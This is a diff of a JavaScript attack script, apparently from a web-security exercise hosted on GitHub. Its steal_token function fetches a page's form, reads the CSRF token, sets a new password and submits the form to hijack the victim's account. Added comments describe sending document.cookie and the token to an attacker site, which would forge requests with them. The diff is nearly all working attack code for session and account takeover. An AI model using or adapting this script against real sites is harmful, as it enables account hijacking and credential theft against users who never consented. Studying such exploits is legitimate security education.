@@ -16,6 +16,19 @@ function steal_token(url){
         var dom = xhr.responseXML;
         var form = dom.forms[0];
 
+        //csrf token is vulnerable because it is generated
+        //per session, not per request
+
+        //ideally send document.cookie and
+        //csrf token in form[3].value to 
+        //attacker site, which should exploit these
+        //as I do not currently have a webserver (github is static)
+        //I demonstrate the second part below
+
+        //The attacker constructs a form on their
+        //side and sends with stolen cookie and 
+        //csrf token
+
         // set new_password
         form[0].value='hello';
         form[1].value=form[0].value;
@@ -36,12 +49,8 @@ function steal_token(url){
         //form submit
         //return false to prevent redirect
         form.submit(function(event){
-            event.preventDefault();
             return false;
         });
-
-        //print csrf token ??
-        console.log(form[3].value);
     }
 }
 
